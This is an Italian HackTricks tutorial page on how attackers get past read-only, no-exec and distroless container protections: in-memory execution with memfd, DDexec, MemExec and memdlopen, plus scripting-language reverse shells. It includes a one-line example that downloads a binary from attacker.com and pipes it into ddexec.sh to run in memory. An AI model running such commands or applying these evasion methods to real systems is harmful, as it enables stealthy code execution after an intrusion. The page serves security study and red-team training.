# Bypass delle protezioni FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video

Nei video seguenti puoi trovare le tecniche menzionate in questa pagina spiegate più approfonditamente:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## scenario read-only / no-exec

È sempre più comune trovare macchine linux montate con **protezione del file system in modalità read-only (ro)**, soprattutto nei container. Questo perché eseguire un container con file system ro è semplice come impostare **`readOnlyRootFilesystem: true`** nella `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Tuttavia, anche se il file system è montato come ro, **`/dev/shm`** sarà comunque scrivibile, quindi è falso che non possiamo scrivere nulla sul disco. Questa cartella, però, sarà **montata con protezione no-exec**, quindi se scarichi un binary qui **non potrai eseguirlo**.

> [!WARNING]
> Dal punto di vista di una red team, questo rende **complicato scaricare ed eseguire** binary che non sono già presenti nel sistema, come backdoor o enumerator come `kubectl`.

## Bypass più semplice: Script

Nota che ho menzionato i binary: puoi **eseguire qualsiasi script** purché l'interprete sia presente sulla macchina, come uno **shell script** se è presente `sh` o uno **script Python** se `python` è installato.

Tuttavia, questo non è sufficiente per eseguire la tua binary backdoor o altri binary tool che potresti dover eseguire.

## Bypass della memoria

Se vuoi eseguire una binary ma il file system non lo consente, il modo migliore per farlo è **eseguirla dalla memoria**, poiché le **protezioni non si applicano** in quel contesto.

### Bypass FD + exec syscall

Se sulla macchina sono presenti alcuni potenti script engine, come **Python**, **Perl** o **Ruby**, potresti scaricare la binary da eseguire direttamente in memoria, memorizzarla in un file descriptor di memoria (`create_memfd` syscall), che non sarà protetto da queste protezioni, e quindi chiamare una **`exec` syscall** indicando l'**fd come file da eseguire**.

Per farlo puoi usare facilmente il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puoi passargli una binary e genererà uno script nel linguaggio indicato con la **binary compressa e codificata in b64**, insieme alle istruzioni per **decodificarla e decomprimerla** in un **fd** creato chiamando la `create_memfd` syscall e a una chiamata alla **exec** syscall per eseguirla.

> [!WARNING]
> Questo non funziona con altri scripting language come PHP o Node, perché non dispongono di alcun **modo predefinito per chiamare raw syscalls** da uno script; pertanto non è possibile chiamare `create_memfd` per creare il **memory fd** in cui memorizzare la binary.
>
> Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, perché non sarà possibile eseguirlo: si applicherà la **protezione no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) è una tecnica che consente di **modificare la memoria del proprio processo** sovrascrivendo il suo **`/proc/self/mem`**.

Pertanto, **controllando il codice assembly** eseguito dal processo, puoi scrivere uno **shellcode** e "mutare" il processo per **eseguire qualsiasi codice arbitrario**.

> [!TIP]
> **DDexec / EverythingExec** ti consentirà di caricare ed **eseguire** il tuo **shellcode** o **qualsiasi binary** dalla **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Per ulteriori informazioni su questa tecnica, consulta Github o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è il naturale passo successivo di DDexec. È una **shellcode DDexec demonizzata**, quindi ogni volta che vuoi **eseguire un binary diverso** non devi rilanciare DDexec: puoi semplicemente eseguire la shellcode di memexec tramite la tecnica DDexec e poi **comunicare con questo demone per passargli nuovi binary da caricare ed eseguire**.

Puoi trovare un esempio su come usare **memexec per eseguire binary da una PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con uno scopo simile a DDexec, la tecnica [**memdlopen**](https://github.com/arget13/memdlopen) consente un **modo più semplice per caricare binary** in memoria e poi eseguirli. Potrebbe persino consentire di caricare binary con dipendenze.

## Distroless Bypass

Per una spiegazione dedicata di **cosa sia realmente distroless**, quando sia utile, quando non lo sia e come modifichi le tecniche di post-exploitation nei container, consulta:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Cos'è distroless

I container distroless contengono solo i **componenti minimi necessari per eseguire una specifica applicazione o servizio**, come librerie e dipendenze di runtime, ma escludono componenti più grandi come un package manager, una shell o le utilità di sistema.

L'obiettivo dei container distroless è **ridurre la attack surface dei container eliminando i componenti non necessari** e minimizzando il numero di vulnerabilità che possono essere sfruttate.

### Reverse Shell

In un container distroless potresti **non trovare nemmeno `sh` o `bash`** per ottenere una shell normale. Inoltre, non troverai binary come `ls`, `whoami`, `id`... tutto ciò che normalmente esegui in un sistema.

> [!WARNING]
> Pertanto, **non** potrai ottenere una **reverse shell** o **enumerare** il sistema come fai di solito.

Tuttavia, se il container compromesso esegue, ad esempio, una web app Flask, allora Python è installato e puoi ottenere una **Python reverse shell**. Se esegue Node, puoi ottenere una Node rev shell, e lo stesso vale per quasi qualsiasi **linguaggio di scripting**.

> [!TIP]
> Utilizzando il linguaggio di scripting potresti **enumerare il sistema** sfruttando le funzionalità del linguaggio.

Se non sono presenti protezioni **`read-only/no-exec`**, potresti abusare della tua reverse shell per **scrivere i tuoi binary nel file system** ed **eseguirli**.

> [!TIP]
> Tuttavia, in questo tipo di container queste protezioni saranno normalmente presenti, ma potresti usare le **precedenti tecniche di esecuzione in memoria per bypassarle**.

Puoi trovare **esempi** su come **sfruttare alcune vulnerabilità RCE** per ottenere **reverse shell** di linguaggi di scripting ed eseguire binary dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## References

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
